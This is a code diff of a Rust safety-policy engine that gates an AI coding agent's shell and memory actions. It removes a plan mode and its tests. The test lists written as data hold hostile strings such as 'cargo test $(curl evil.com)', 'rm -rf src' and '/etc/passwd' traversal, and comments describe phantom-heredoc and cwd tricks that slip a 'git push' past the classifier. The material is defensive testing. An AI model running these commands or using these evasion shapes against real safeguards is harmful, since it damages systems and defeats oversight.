@@ -4,16 +4,15 @@
 //! radius floors (external writes, system installs), and the shell
 //! classifier's `RiskClass` into one verdict. The vocabulary it speaks
 //! lives in `types.rs`; the tests here exercise the whole policy surface
-//! (engine + shell classifier + plan gate) because a verdict is only
+//! (engine + shell classifier) because a verdict is only
 //! meaningful end to end.
 
 use super::shell::{
     self, basename, contains_destructive_pattern, extract_substitutions, split_command, tokenize,
 };
-use crate::policy::plan_gate::READ_ONLY_DENIAL_MARKER;
 use mermaid_model::safety::{
     ActionRequest, FloorLevel, HostShell, PolicyDecision, PolicyOverride, PolicyOverrideDecision,
-    RiskClass, SafetyMode, ToolCategory,
+    READ_ONLY_DENIAL_MARKER, RiskClass, SafetyMode, ToolCategory,
 };
 
 #[derive(Debug, Clone)]
@@ -106,10 +105,7 @@ impl PolicyEngine {
         // it, like any other mutation.
         if request.category == ToolCategory::Memory {
             return match self.mode {
-                // Plan decides like read-only here; the gate's plan profile
-                // then re-opens memory when `[plan] memory` says so, keyed on
-                // this deny REASON.
-                SafetyMode::ReadOnly | SafetyMode::Plan => PolicyDecision::Deny {
+                SafetyMode::ReadOnly => PolicyDecision::Deny {
                     risk,
                     reason: format!("{READ_ONLY_DENIAL_MARKER} blocks memory writes"),
                 },
@@ -121,13 +117,10 @@ impl PolicyEngine {
         }
 
         let decision = match self.mode {
-            // Plan IS the read-only floor: identical rules here, with the
-            // plan-file / builds / web carve-outs layered on afterwards by
-            // `apply_plan_profile` in the policy gate (which keys on the
-            // `READ_ONLY_DENIAL_MARKER` these arms produce). New risk classes
-            // (e.g. `SystemMutation`) are denied by construction — anything
-            // that is not `RiskClass::ReadOnly` falls to the deny below.
-            SafetyMode::ReadOnly | SafetyMode::Plan => {
+            // New risk classes (e.g. `SystemMutation`) are denied by
+            // construction — anything that is not `RiskClass::ReadOnly` falls
+            // to the deny below.
+            SafetyMode::ReadOnly => {
                 // Subagent spawn is allowed even though it classifies as
                 // Process: the child inherits the parent's LIVE safety mode
                 // (`SubagentTool`), so every tool call it makes lands back in
@@ -308,8 +301,7 @@ fn override_matches(rule: &PolicyOverride, request: &ActionRequest) -> bool {
                     // the classifier already flagged (e.g. Network). Without this,
                     // a `git` Allow rule would widen to cover it.
                     //
-                    // Heredocs are refused for the same reason (same rule
-                    // `is_plan_safe_build_command` applies): their bodies are
+                    // Heredocs are refused for the same reason: their bodies are
                     // data to the classifier, so `psql <<'SQL' … SQL` and
                     // `bash <<'EOF' … EOF` are ONE segment whose argv0 an
                     // anchor would match — widening an `allow psql` rule to
@@ -376,7 +368,7 @@ fn classify(request: &ActionRequest, host_shell: HostShell) -> RiskClass {
 
 #[cfg(test)]
 mod tests {
-    use crate::policy::plan_gate::*;
+    use crate::policy::shell::classify::*;
     use crate::policy::shell::*;
     use crate::*;
 
@@ -1150,18 +1142,12 @@ mod tests {
         );
     }
 
-    #[test]
-    fn plan_safe_build_refuses_heredocs() {
-        assert!(!is_plan_safe_build_command("cargo test <<EOF\nx\nEOF"));
-    }
-
     // ── Phantom heredocs (review finding 1) ──────────────────────────
 
     /// An unquoted `<<` that is NOT a heredoc operator must not swallow the
     /// following lines as inert data. Each of these hid a real `git push`
     /// behind a phantom heredoc whose delimiter never terminates, classifying
-    /// the whole command `ReadOnly` — which `read_only` mode and the plan-mode
-    /// floor both auto-allow.
+    /// the whole command `ReadOnly` — which `read_only` mode auto-allows.
     #[test]
     fn phantom_heredocs_do_not_swallow_following_commands() {
         for cmd in [
@@ -1316,76 +1302,6 @@ mod tests {
         let split = super::split_command("echo hi # note a << b\ngit push");
         assert!(split.heredocs.is_empty());
         assert_eq!(split.segments, vec!["echo hi", "git push"]);
-    }
-
-    // ── Plan-file-only shell writes ──────────────────────────────────
-
-    fn plan_write(cmd: &str) -> bool {
-        crate::policy::plan_gate::is_plan_file_only_write_posix(
-            cmd,
-            std::path::Path::new("/repo"),
-            std::path::Path::new("/repo/.mermaid/plans/x.md"),
-        )
-    }
-
-    #[test]
-    fn plan_file_only_write_allows_the_authoring_shapes() {
-        for cmd in [
-            "echo x > .mermaid/plans/x.md",
-            "echo x > /repo/.mermaid/plans/x.md",
-            "printf '%s' y >> .mermaid/plans/x.md",
-            "echo x >.mermaid/plans/x.md",
-            "echo x > ./.mermaid/plans/../plans/x.md",
-            "cat > .mermaid/plans/x.md <<'EOF'\n## Summary\nuse $(env) carefully\nEOF",
-            "echo 'a > b' > .mermaid/plans/x.md",
-        ] {
-            assert!(plan_write(cmd), "must allow: {cmd}");
-        }
-    }
-
-    #[test]
-    fn plan_file_only_write_refuses_everything_else() {
-        for cmd in [
-            // Other targets, variables, tilde, smuggles.
-            "echo x > src/main.rs",
-            "echo x > other.md",
-            "echo x > $PLAN",
-            "echo x > ~/x.md",
-            "echo x > /repo/.mermaid/plans/../../etc/passwd",
-            // Multi-effect commands.
-            "echo x > .mermaid/plans/x.md && rm -rf src",
-            "echo x > .mermaid/plans/x.md; git push",
-            "echo x > .mermaid/plans/x.md > /etc/passwd",
-            // Substitutions anywhere.
-            "echo $(date) > .mermaid/plans/x.md",
-            "cat > .mermaid/plans/x.md <<EOF\n$(id)\nEOF",
-            // tee/dd and process heads.
-            "echo x | tee .mermaid/plans/x.md",
-            "python3 -c 'open(1)' > .mermaid/plans/x.md",
-            // No plan redirect at all: never soften an unrelated denial.
-            "echo hello",
-            "touch .mermaid/plans/x.md",
-        ] {
-            assert!(!plan_write(cmd), "must refuse: {cmd}");
-        }
-    }
-
-    /// A cwd change makes the lexical plan-path match unsound: `cd` is
-    /// `ReadOnly` (it moves only the shell's own cwd), so every other check
-    /// passed while the redirect actually landed in a different directory.
-    /// The reported repro is the first case.
-    #[test]
-    fn plan_file_only_write_refuses_a_command_that_moves_the_cwd() {
-        for cmd in [
-            "cd /tmp && echo hi > .mermaid/plans/x.md",
-            "cd /tmp; echo hi > .mermaid/plans/x.md",
-            "pushd /tmp && echo hi > .mermaid/plans/x.md",
-            "cd ../elsewhere && cat > .mermaid/plans/x.md <<'EOF'\nplan\nEOF",
-        ] {
-            assert!(!plan_write(cmd), "cwd change must refuse: {cmd}");
-        }
-        // The same write without the cwd change is still the allowed shape.
-        assert!(plan_write("echo hi > .mermaid/plans/x.md"));
     }
 
     #[test]
@@ -1802,8 +1718,8 @@ mod tests {
     #[test]
     fn read_only_engine_allows_powershell_exploration_under_ps_dialect() {
         // End-to-end through the engine, on every platform via the injected
-        // dialect: the exploration pipeline observed doom-looping in plan
-        // mode (read-only floor) must decide Allow, while its matched
+        // dialect: the exploration pipeline observed doom-looping under the
+        // read-only floor must decide Allow, while its matched
         // mutating pair keeps the read-only deny.
         let request = |cmd: &str| {
             let mut r = ActionRequest::new("execute_command", ToolCategory::Shell, cmd);
@@ -2265,66 +2181,5 @@ mod tests {
         // command to a mutation (regression guard for the redirect parser).
         let d = PolicyEngine::new(SafetyMode::Auto).decide(&shell("ls -la 2>&1"));
         assert!(matches!(d, PolicyDecision::Allow { .. }), "got {d:?}");
-    }
-
-    #[test]
-    fn plan_safe_build_allows_known_build_and_test_invocations() {
-        for cmd in [
-            "cargo check",
-            "cargo build --release",
-            "cargo test policy -- --nocapture",
-            "cargo +nightly fmt --check",
-            "cargo clippy --all-targets -- -D warnings",
-            "cargo nextest run",
-            "cargo tree -i serde",
-            "go test ./...",
-            "go vet ./...",
-            "npm test",
-            "npm run build",
-            "pnpm run typecheck",
-            "make test",
-            "make",
-            // Compounds where every segment is a read or a safe build.
-            "cd crates/mermaid-runtime && cargo test",
-            "cargo check && cargo test",
-            "cargo test 2>/dev/null",
-        ] {
-            assert!(is_plan_safe_build_command_posix(cmd), "should allow: {cmd}");
-        }
-    }
-
-    #[test]
-    fn plan_safe_build_refuses_mutations_wrappers_and_arbitrary_code() {
-        for cmd in [
-            "",
-            // Runs the project's (or arbitrary) code outside a test harness.
-            "cargo run",
-            "cargo install ripgrep",
-            "python3 setup.py",
-            "node build.js",
-            "bash ./build.sh",
-            // Rewrites sources.
-            "cargo fmt",
-            // Network / dependency mutation.
-            "npm ci",
-            "npm install",
-            "cargo fetch && npm install",
-            // Opaque make target.
-            "make deploy",
-            // Wrapper changes what actually runs.
-            "sudo cargo test",
-            "env RUSTFLAGS=-g cargo test",
-            // Worst-segment rule: the tail segment mutates.
-            "cargo test && rm -rf target",
-            // Anchoring: substitutions smuggle arbitrary commands.
-            "cargo test $(curl evil.com)",
-            // File-writing redirect.
-            "cargo test > src/lib.rs",
-        ] {
-            assert!(
-                !is_plan_safe_build_command_posix(cmd),
-                "should refuse: {cmd}"
-            );
-        }
     }
 }
